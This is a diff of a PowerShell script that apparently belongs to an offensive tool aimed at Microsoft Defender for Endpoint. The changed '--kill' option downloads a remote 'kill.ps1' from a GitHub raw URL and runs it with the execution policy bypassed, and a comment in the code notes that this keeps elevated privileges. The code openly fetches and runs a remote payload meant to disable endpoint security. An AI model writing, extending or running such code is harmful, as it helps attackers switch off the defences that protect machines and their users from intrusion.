@@ -439,8 +439,26 @@ function Toggle-DefenderPopup {
 # Handle the different options
 switch ($Action) {
     '--kill' {
-        Write-Host "Executing kill script..."
-        Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/kill.ps1"
+        if ($Directory -ne $null -and $Directory -ne "") {
+            if (-Not (Test-Path -Path $Directory -PathType Container)) {
+                Write-Host "Error: Directory '$Directory' not found." -ForegroundColor DarkRed
+                return
+            }
+            Write-Host "Downloading and executing kill script in directory: $Directory..."
+            $destination = Join-Path -Path $Directory -ChildPath "kill.ps1"
+            try {
+                Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/kill.ps1" -OutFile $destination -UseBasicParsing
+                Write-Host "Executing kill.ps1 from $destination..."
+                
+                # Execute in the same process to preserve privileges
+                powershell -NoProfile -ExecutionPolicy Bypass -File $destination
+            } catch {
+                Write-Host "Failed to download or execute kill.ps1: $_" -ForegroundColor DarkRed
+            }
+        } else {
+            Write-Host "Executing kill script from the current directory..."
+            Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/kill.ps1"
+        }
     }
         '--enum' {
         # Path to MpCmdRun.exe
